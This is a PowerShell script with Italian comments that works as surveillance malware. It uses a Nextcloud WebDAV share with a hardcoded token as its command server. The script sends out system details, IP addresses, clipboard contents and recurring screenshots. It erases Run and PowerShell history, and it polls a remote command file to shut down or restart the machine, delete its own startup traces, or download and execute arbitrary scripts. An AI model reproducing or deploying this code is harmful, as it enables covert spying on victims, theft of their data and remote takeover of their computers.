Add-Type -AssemblyName System.Windows.Forms, System.Drawing

$AccessToken = "mwgwxBBRLwxCeGj"
<# Carica un file su nextcloud #>
function Nextcloud-Upload {

	[CmdletBinding()]
	param ($SourceFilePath, $AccessToken)

	[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

	$nextcloudUrl = "https://liv.nl.tab.digital/"
	$file = $SourceFilePath
	$fileObject = Get-Item $file

	$headers = @{
		"Authorization"=$("Basic $([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($("$($AccessToken):"))))");
		"X-Requested-With"="XMLHttpRequest";
	}

	$pcFolder = "$($nextcloudUrl)/public.php/webdav/$env:computername"

	try {
		Invoke-RestMethod -Uri $pcFolder -Headers $headers -Method Head -ErrorAction SilentlyContinue # controllo se esiste la cartella con lo stesso nome del computer
		if(((Split-Path $SourceFilePath -Leaf).Split('\') | Select-Object -Last 1) -eq "command.txt"){ # controllo se il file che voglio caricare si chiama command.txt
			Throw
		}
		$webdavUrl = "$($nextcloudUrl)/public.php/webdav/$env:computername/$($fileObject.Name)"
	}
	catch {
		$webdavUrl = "$($nextcloudUrl)/public.php/webdav/$($fileObject.Name)"
	}

	Invoke-RestMethod -Uri $webdavUrl -InFile $fileObject.Fullname -Headers $headers -Method Put
}
<# Scarica un file caricato su nextcloud #>
function Nextcloud-Download {

    [CmdletBinding()]
    param ($FileName, $AccessToken, $destinationFolder)

    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

    $nextcloudUrl = "https://liv.nl.tab.digital/"
	$fileUrl = "$nextcloudUrl/public.php/webdav/$FileName"

    $headers = @{
		"Authorization"=$("Basic $([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($("$($AccessToken):"))))");
		"X-Requested-With"="XMLHttpRequest";
	}

	try{
		Invoke-RestMethod -Uri $fileUrl -Headers $headers -OutFile $destinationFolder
	}
	catch{
		Write-Host ""
	}
}
<# Restituisce il contenuto di un file caricato su nextcloud #>
function Nextcloud-OpenFile {

    [CmdletBinding()]
    param ($FileName, $AccessToken)

    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

    $nextcloudUrl = "https://liv.nl.tab.digital/"
	$fileUrl = "$nextcloudUrl/public.php/webdav/"

    $headers = @{
		"Authorization"=$("Basic $([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($("$($AccessToken):"))))");
		"X-Requested-With"="XMLHttpRequest";
	}

	if($fileName -eq "command.txt"){
		try{
			Invoke-RestMethod -Uri "$fileUrl/$fileName" -Headers $headers -Method Get
		}catch{}
	}else{
		try{
			Invoke-RestMethod -Uri "$fileUrl/$env:computername/$fileName" -Headers $headers -Method Get
		}catch{
			try{
				Invoke-RestMethod -Uri "$fileUrl/$fileName" -Headers $headers -Method Get
			}catch{}
		}
	}

}
<# Scarica un file caricato su github #>
function Github-Download{
	[CmdletBinding()]
	param ($ScriptUrl, $destinationFolder)

	$nameScript = (Split-Path $ScriptUrl -Leaf).Split('/') | Select-Object -Last 1

	Invoke-WebRequest -Uri $ScriptUrl -OutFile "$destinationFolder\$nameScript"

	return $nameScript
}
<# Restituisce alcune informazioni sul computer che ha eseguito lo script #>
function Get-ComputerInformation {

    Try { #Begin Try

        #Null out variables used in the function
        #This isn't needed, but I like to declare variables up top
        $adminPasswordStatus = $null
        $thermalState        = $null
		$pcSystemType		 = $null
        $cimSession          = $null
        $computerObject      = $null
        $errorMessage        = $null

        #This will be used when errors are encountered
        $unableMsg           = 'Unable to determine'

        #Gather information using Get-CimInstance
        #ErrorAction is set to Stop here, so we can catch any errors
        $osInfo       = Get-CimInstance Win32_OperatingSystem -ErrorAction Stop
        $computerInfo = Get-CimInstance Win32_ComputerSystem  -ErrorAction Stop
        $diskInfo     = Get-CimInstance Win32_LogicalDisk     -ErrorAction Stop

        #Use a switch to get the text value based on the number in $computerInfo.AdminPasswordStatus
        Switch ($computerInfo.AdminPasswordStatus) {

			0 {$adminPasswordStatus = 'Disabled'}
			1 {$adminPasswordStatus = 'Enabled'}
			2 {$adminPasswordStatus = 'Not Implemented'}
			3 {$adminPasswordStatus = 'Unknown'}
            Default {$adminPasswordStatus = 'Unable to determine'}

        }

        #Use a switch to get the text value based on the number in $computerInfo.ThermalState
        Switch ($computerInfo.ThermalState) {

			1 {$thermalState = 'Other'}
			2 {$thermalState = 'Unknown'}
			3 {$thermalState = 'Safe'}
			4 {$thermalState = 'Warning'}
			5 {$thermalState = 'Critical'}
			6 {$thermalState = 'Non-recoverable'}
            Default {$thermalState = 'Unable to determine'}

        }

		Switch ($computerInfo.PCSystemType) {

			0 {$pcSystemType = 'Unspecified'}
			1 {$pcSystemType = 'Desktop'}
			2 {$pcSystemType = 'Mobile'}
			3 {$pcSystemType = 'Workstation'}
			4 {$pcSystemType = 'Enterprise Server'}
			5 {$pcSystemType = 'Small Office and Home Office (SOHO) Server'}
			6 {$pcSystemType = 'Appliance PC'}
			7 {$pcSystemType = 'Performance Server'}
			8 {$pcSystemType = 'Maximum'}
            Default {$pcSystemType = 'Unable to determine'}

        }

        #Create the object
        $computerObject = [PSCustomObject]@{

            ComputerName        = $computerInfo.Name
            OS                  = $osInfo.Caption
            'OS Version'        = $("$($osInfo.Version) Build $($osInfo.BuildNumber)")
            Domain              = $computerInfo.Domain
            Workgroup           = $computerInfo.Workgroup
            DomainJoined        = $computerInfo.PartOfDomain
            Disks               = $diskInfo
            AdminPasswordStatus = $adminPasswordStatus
            ThermalState        = $thermalState
			Manufacturer		= $computerInfo.Manufacturer
			Model				= $computerInfo.Model
			PCSystemType		= $pcSystemType
            Error               = $false
            ErrorMessage        = $null

        }


        #Return the object created
        Return $computerObject

    } #End Try

    Catch { #Begin Catch

        #Capture the exception message in the $errorMessage variable
        $errorMessage = $_.Exception.Message

        #Create the custom object with the error message
        $computerObject = [PSCustomObject]@{

            ComputerInput       = $computerName
            ComputerName        = $unableMsg
            OS                  = $unableMsg
            'OS Version'        = $unableMsg
            Domain              = $unableMsg
            Workgroup           = $unableMsg
            DomainJoined        = $unableMsg
            Disks               = $unableMsg
            AdminPasswordStatus = $unableMsg
            ThermalState        = $unableMsg
            Error               = $true
            ErrorMessage        = $errorMessage

        }

        Write-Host `n"Error encountered [$errorMessage]!"`n -ForegroundColor Red -BackgroundColor DarkBlue

        #Return the object created
        Return $computerObject

        #Stop processing commands
        Break

    } #End Catch

}
<# Legge il file di configurazione caricato su nextcloud #>
function json_reader {

	[CmdletBinding()]
    param ($FileName)

	$json = Get-Content $FileName | Out-String | ConvertFrom-Json

	$configObject = [PSCustomObject]@{

		Operations = $json.operations
		TimeStart = $json.time_start
		TimeEnd = $json.time_end
		NetworkMapping = $json.network_mapping
		WifiDump = $json.wifi_dump
		ScreenShots = $json.screenshots
		Keylogger = $json.Keylogger
		InfoComputer = $json.info_computer
		DefaultScripts = $json.default_scripts
		DeleteHistory = $json.delete_history
		Clipboard = $json.clipboard
		Interval = $json.interval
		CommandControl = $json.command_control
		NumberScreenshot = $json.number_screenshot
		Scripts = $json.scripts
		String = $json.string

	}

	return $configObject
}
<# Elimina i file scaricati dallo script avvio.vbs e lo script stesso #>
function Delete-Files {

	$path = "C:\Users\$env:computername\AppData\Roaming\Microsoft\Windows\Start Menu\Programs"
	Remove-Item -Path "$path\ScriptFolder" -Recurse
	Remove-Item "$path\Startup\avvio.vbs" -Force
}
<# Esegue uno script attraverso un job #>
function ExecuteJob{

	[CmdletBinding()]
    param ($nameScript)

    # Crea un nuovo job per eseguire lo script
    $job = Start-Job -ScriptBlock {
        param($Path)
        Invoke-Expression -Command "& $Path"
    } -ArgumentList $nameScript

    # Restituisci l'oggetto del job
    return $job
}

# ========================================================================================================================= #

<# CARICA FILE DI CONFIGURAZIONE #>
	Nextcloud-Download -FileName "config.json" -AccessToken $AccessToken -destinationFolder "$PSScriptRoot/config.json"
	$config = json_reader -FileName "$PSScriptRoot\config.json"

# ========================================================================================================================= #

<# CARICA FILE INFO COMPUTER #>
	if($config.InfoComputer){
		[System.Collections.ArrayList]$computerArray = @()
		$computerArray.Add((Get-ComputerInformation -computerName $computer)) | Out-Null

		$date = (Get-Date).ToString("yyyy.MM.dd")
		$time = (Get-Date).ToString("HH.mm.ss")
		$outputFile = "$PSScriptRoot\computer_info-$date-$time.txt"

		$computerArray | Out-File -FilePath $outputFile -Encoding UTF8
		Nextcloud-Upload -SourceFilePath $outputFile -AccessToken $AccessToken
		Remove-Item $outputFile
	}

# ========================================================================================================================= #

<# CANCELLA CRONOLOGIA #>
	if($config.DeleteHistory){

		# cronologia esegui
		$regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
		if (Test-Path $regKey) {
			Remove-ItemProperty -Path $regKey -Name '*' -ErrorAction SilentlyContinue
		}

		# cronologia powershell
		[System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
		[System.Windows.Forms.SendKeys]::Sendwait('%{F7 2}')
	}

# =========================================================================================================================

<# CREAZIONE FILE IP #>
	if($config.NetworkMapping){
		$publicIP   = Invoke-RestMethod -Uri "https://api.ipify.org?format=text"
		$privateIP  = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' -and $_.PrefixOrigin -eq 'Manual' }).IPAddress

		$date = (Get-Date).ToString("yyyy.MM.dd")
		$time = (Get-Date).ToString("HH.mm.ss")
		$outputFile = "$PSScriptRoot\ip-$date-$time.txt"

		$ipContent = @"
		Indirizzo IP pubblico: $publicIP
		Indirizzo IP privato: $privateIP
"@

		$ipContent | Out-File -FilePath $outputFile -Encoding UTF8
		Nextcloud-Upload -SourceFilePath $outputFile -AccessToken $AccessToken
		Remove-Item $outputFile
	}

# =========================================================================================================================

<# ESEGUI SCRIPTS DEL FILE DI CONFIGURAZIONE #>
	if($config.DefaultScripts){
		if($config.Scripts -ne ""){
			foreach($scriptUrl in $config.Scripts){
				DownloadExecute-Script -ScriptUrl $ScriptUrl
			}
		}
	}

# =========================================================================================================================

$temp = 0
$p1   = [System.Windows.Forms.Cursor]::Position
$runScreen  = $true
$n = 0
$repeatCode = ""

while ($n -clt $config.NumberScreenshot -or $config.NumberScreenshot -eq 0) {

	$now = Get-Date

	# ===================================================================================================================== #

	<# CONTROLLO FILE DEI COMANDI #>
	if([int]$temp % ([int]$config.Interval * [int]$config.CommandControl) -eq 0 -or $temp -eq 0){ # ogni n screen verifica se il file dei comandi è cambiato
		$command = Nextcloud-OpenFile -FileName "command.txt" -AccessToken $AccessToken
		$command = $command.split(" ")

		# controllo quante volte deve essere eseguito ancora il comando
		if($command -ne "" -and $command[2] -ne 0 -and $command.Count -gt 2){
			if($repeatCode -eq ""){
				$repeatCode = $command[2]
			}
			if($repeatCode -cgt 1){
				$repeatCode -= 1
			}else{
				"" | Out-File -FilePath "$PSScriptRoot\command.txt" -Encoding UTF8
				Nextcloud-Upload -SourceFilePath "$PSScriptRoot\command.txt" -AccessToken $AccessToken
				Remove-Item "$PSScriptRoot\command.txt"
				$repeatCode = ""
			}
		}

		# controllo se devo eseguire il codice
		if($command -ne ""){
			if($command[0].Substring(0, 1) -eq "!"){
				$command[0] = $command[0].Substring(1)
				if($command[0] -eq $env:computername){
					$me = $false
				}else{
					$me = $true
				}
			}else{
				if($command[0] -eq $env:computername -or $command[0] -eq "ALL"){
					$me = $true
				}else{
					$me = $false
				}
			}
		}

		# controllo il comando da eseguire DOTO
		Write-Host "command: " $command
		if($command[1] -eq "pauseScreen" -and $me){
			$runScreen = $false
		}
		if($command[1] -eq "startScreen" -and $me){
			$runScreen = $true
		}
		if($command[1] -eq "stopScript" -and $me){
			break
		}
		if($command[1] -eq "clearFiles" -and $me){
			Delete-Files
		}
		if($command[1] -eq "offPC" -and $me){
			Stop-Computer -Force
		}
		if($command[1] -eq "restartPC" -and $me){
			Restart-Computer -Force
		}
		if($command[1] -eq "runCode" -and $me){
			if($command[3] -eq "numberCode"){
				$code = Github-Download -ScriptUrl $config.Scripts[$command[4]-1] -destinationFolder $PSScriptRoot
			}else{
				$code = $command[3]
				Nextcloud-Download -FileName "scripts/$code" -AccessToken $AccessToken -destinationFolder "$PSScriptRoot\$code"
			}

			# creo ed eseguo il job in parallelo con il resto del programma
			$job = ExecuteJob -nameScript "$PSScriptRoot\$code"
			$eventAction = {
				$eventSubscriber | Unregister-Event
				$eventSubscriber.Action | Remove-Job -Force
				Remove-Item -Path "$PSScriptRoot\$code" -Force
			}
			$eventSubscriber = Register-ObjectEvent -InputObject $job -EventName StateChanged -Action $eventAction
		}
	}

	# ===================================================================================================================== #

	<# CREAZIONE FILE CLIPBOARD CONTENT #>
	if($config.Clipboard){
		$fileContent = @()
		$date = (Get-Date).ToString("dd/MM/yyyy")
		$time = (Get-Date).ToString("HH:mm:ss")

		$cloudfileContent = Nextcloud-OpenFile -FileName "$env:computername-clipboard.txt" -AccessToken $AccessToken # contenuto del file caricato sul cloud
		$clipboardContent = [System.Windows.Forms.Clipboard]::GetText() # nuovo contenuto del file

		$fileContent += $cloudfileContent
		$fileContent += "# ===== $date - $time ============================== #"
		$fileContent += "$clipboardContent`n"

		$outputFile = "$PSScriptRoot\$env:computername-clipboard.txt"

		$fileContent | Out-File -FilePath $outputFile -Encoding UTF8
		Nextcloud-Upload -SourceFilePath $outputFile -AccessToken $AccessToken
		Remove-Item $outputFile
	}

	# ===================================================================================================================== #

	<# CREA SCREEN DELLO SCHERMO #>
	if ($now -ge $config.TimeStart -and $now -lt $config.TimeEnd -and $runScreen -and $config.ScreenShots) {

		# Crea e salva gli screen ogni 5 secondi
		$screens = [Windows.Forms.Screen]::AllScreens

		$top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
		$left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
		$width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
		$height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum

		$bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
		$bmp      = New-Object -TypeName System.Drawing.Bitmap -ArgumentList ([int]$bounds.width), ([int]$bounds.height)
		$graphics = [Drawing.Graphics]::FromImage($bmp)

		$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

		$date = (Get-Date).ToString("yyyy.MM.dd")
		$time = (Get-Date).ToString("HH.mm.ss")
		$bmp.Save("$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture-$date-$time.png")
		$graphics.Dispose()
		$bmp.Dispose()

		$sourcePath = "$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture-$date-$time.png"
		Nextcloud-Upload -SourceFilePath $sourcePath -AccessToken $AccessToken

		# verifico se il mouse si sta muovendo ogni 10 min
		if ($temp -eq 600) {

			$p2 = [System.Windows.Forms.Cursor]::Position
			if ($p1.X -eq $p2.X -and $p1.Y -eq $p2.Y) {

				# attendo che vengano rilevati nuovi movimenti del mouse
				$attendi = $true
				while($attendi){
					$p1 = [System.Windows.Forms.Cursor]::Position
					Start-Sleep -Seconds $config.Interval
					$p2 = [System.Windows.Forms.Cursor]::Position

					if($p1.X -ne $p2.X -or $p1.Y -ne $p2.Y){
						$attendi = $false
						$p1      = [System.Windows.Forms.Cursor]::Position
						$temp    = 0
					}
				}

			} else {
				$p1   = [System.Windows.Forms.Cursor]::Position
				$temp = 0
			}
		}
		$n += 1
		$temp += $config.Interval
	}

	# ===================================================================================================================== #

	Start-Sleep -Seconds $config.Interval
}
